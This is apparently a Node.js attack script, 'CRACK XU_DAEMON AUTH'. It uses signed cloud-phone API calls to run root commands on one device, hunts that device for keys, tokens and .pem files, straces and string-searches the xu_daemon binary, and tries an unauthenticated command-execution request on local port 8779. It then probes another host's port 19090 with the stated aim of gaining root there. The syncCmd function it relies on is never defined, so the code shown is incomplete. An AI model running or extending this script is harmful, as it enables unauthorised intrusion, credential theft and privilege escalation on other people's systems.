#!/usr/bin/env node
/**
 * Find xu_daemon auth mechanism:
 * 1. On D1 (root): find binder service, tokens, config
 * 2. Use D1 to call .220's xu_daemon HTTP API (port 19090) with found auth
 * 3. If auth works, execute root commands on .220
 */
const net = require('net');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const { AK, SK, HOST, D1, CT, SHD } = require('../shared/vmos_api');
const SRC_IP = '10.0.26.220';

function sign(b) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8), CT = 'application/json;charset=UTF-8', SHD = 'content-type;host;x-content-sha256;x-date';
  const bh = crypto.createHash('sha256').update(b, 'utf8').digest('hex');
  const can = `host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;
  const ch = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = `HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;
  let k = crypto.createHmac('sha256', SK).update(sd).digest();
  k = crypto.createHmac('sha256', k).update('armcloud-paas').digest();
  k = crypto.createHmac('sha256', k).update('request').digest();
  return { 'content-type': CT, 'x-date': xd, 'x-host': HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256', k).update(sts).digest('hex')}` };
}
function apiPost(ep, d, t) {
  return new Promise(ok => {
    const b = JSON.stringify(d || {}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({ hostname: HOST, path: ep, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (t || 60) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1 }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99 }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.write(buf); req.end();
  });
}

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);

async function main() {
  console.log('═'.repeat(60));
  console.log('  CRACK XU_DAEMON AUTH');
  console.log('═'.repeat(60));

  // 1. D1: Find all binder services
  log('=== D1: All Binder services ===');
  const allSvc = await syncCmd(D1, 'service list 2>/dev/null | head -40', 15);
  log(allSvc.slice(0, 500));

  // 2. D1: xu_daemon process details
  log('\n=== D1: xu_daemon process details ===');
  const xuProc = await syncCmd(D1, 'cat /proc/$(pidof xu_daemon)/maps 2>/dev/null | head -20', 15);
  log(xuProc.slice(0, 500));

  // 3. D1: Find xu_daemon's network connections
  log('\n=== D1: xu_daemon network activity ===');
  const xuNet = await syncCmd(D1, 'cat /proc/$(pidof xu_daemon)/net/tcp 2>/dev/null | head -20', 15);
  log(xuNet.slice(0, 500));

  // 4. D1: Port 8779 owner and detailed probing
  log('\n=== D1: Port 8779 detailed probe ===');
  const p8779 = await syncCmd(D1, 'ss -tlnp | grep 8779; echo ---; curl -s -X POST -H "Content-Type: application/json" -d \'{"action":"executeBatchCommand","cmd":"id"}\' http://127.0.0.1:8779/ 2>&1', 15);
  log(p8779);

  // 5. D1: xu_daemon strings - find URL patterns and auth keywords
  log('\n=== D1: xu_daemon auth-related strings ===');
  const xuStrs = await syncCmd(D1, 'strings /system/bin/xu_daemon 2>/dev/null | grep -iE "auth|token|key|secret|bearer|jwt|sign|hmac|password|cert|tls|http|port|listen|gin|echo|fiber|gorilla" | sort -u | head -40', 20);
  log(xuStrs);

  // 6. D1: Check what other processes/ports exist
  log('\n=== D1: All listening ports with process info ===');
  const allPorts = await syncCmd(D1, 'ss -tlnp 2>/dev/null', 10);
  log(allPorts);

  // 7. D1: Strace xu_daemon briefly to see what it does when syncCmd arrives
  log('\n=== D1: xu_daemon strace (5s) during command ===');
  // Start strace in background, then trigger a syncCmd
  const strace = await syncCmd(D1, 'timeout 3 strace -p $(pidof xu_daemon) -e trace=network,write,read -f 2>&1 | head -50', 15);
  log(strace.slice(0, 500));

  // 8. Find auth config files on D1
  log('\n=== D1: Config/auth files ===');
  const cfgFiles = await syncCmd(D1, 'find /data /system /etc -maxdepth 3 \\( -name "*.conf" -o -name "*.cfg" -o -name "*.json" -o -name "*.key" -o -name "*.pem" -o -name "*.token" \\) 2>/dev/null | grep -v "app\\|cache\\|tombstone" | head -30', 20);
  log(cfgFiles);

  // 9. Check the "m" process on port 8779
  log('\n=== D1: "m" process (port 8779) ===');
  const mProc = await syncCmd(D1, 'ps -A | grep " m$"; echo ---; ls -la /proc/$(pidof m)/exe 2>/dev/null; echo ---; cat /proc/$(pidof m)/cmdline 2>/dev/null | tr "\\0" " "; echo ---; strings /proc/$(pidof m)/exe 2>/dev/null | grep -iE "auth|token|gin|echo|http|route|handler|cmd|exec" | head -30', 20);
  log(mProc);

  // 10. D1: Try to use root to curl .220:19090 with various auth approaches
  log('\n=== D1 root → .220:19090 ===');
  
  // Try no auth
  const r1 = await syncCmd(D1, 'curl -s -w "\\nHTTP:%{http_code}" http://10.0.26.220:19090/ 2>&1', 10);
  log('No auth: ' + r1.slice(0, 200));

  // Check if the service is accessible from outside at all
  const r2 = await syncCmd(D1, 'curl -s -w "\\nHTTP:%{http_code}" --connect-timeout 3 http://10.0.26.220:19090/ 2>&1', 10);
  log('Remote access: ' + r2.slice(0, 200));

  // 19090 might be 127.0.0.1 only - try from .220's localhost via ADB
  log('\n=== .220: localhost port scan for xu_daemon ===');
  // Get full ss output with process names on .220
  const ssFull = await syncCmd(D1, 'echo "GET / HTTP/1.0" | nc -w 3 10.0.26.220 19090 2>&1 | head -5', 10);
  log('.220:19090 from D1: ' + ssFull);
}

main().catch(e => console.error('FATAL:', e));
